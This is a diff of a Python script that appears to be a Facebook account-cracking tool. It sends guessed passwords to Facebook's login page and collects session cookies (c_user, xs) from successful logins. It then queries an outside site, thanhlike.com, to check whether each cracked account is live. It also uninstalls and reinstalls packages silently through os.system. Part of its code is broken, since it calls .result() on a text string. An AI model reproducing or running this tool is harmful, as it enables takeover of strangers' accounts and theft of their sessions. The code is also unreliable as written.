@@ -29,17 +29,17 @@ from licensing.models import *
 from licensing.methods import Key, Helpers
 os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 try:
-    import concurrent.futures
+    import requests_html
 except ImportError:
     print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing requests_html !...\n')
     time.sleep(0.5)
-    os.system('pip install pycurl')
+    os.system('pip install requests_html')
 try: 
-    import bs4
+    import lxml.html.clean
 except ImportError:
     print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing lxml.html.clean !...\n')
     time.sleep(0.5)
-    os.system('pip install bs4')
+    os.system('pip install lxml.html.clean')
 os.system('clear')
 print('\x1b[38;5;34m        𝗧𝗢𝗢𝗟𝗦 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗗𝗘𝗧𝗘𝗖𝗧...   ')
 class jalan:
@@ -1517,9 +1517,9 @@ def m6(ids,pwv):
             'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4425.124 Safari/537.36'}
             future =session.post('https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzExNTI2MzE4LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D',data=info,headers=update).text
             response = future.result()
-            log_cookies=response.cookies.get_dict().keys()
+            log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies or 'm_page_voice' in log_cookies or 'xs' in log_cookies:
-                coki=";".join([key+"="+value for key,value in response.cookies.get_dict().items()])
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = re.findall('c_user=(.*);xs',coki)[0]
                 ckk = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={uid}"
                 res = requests.get(ckk).text
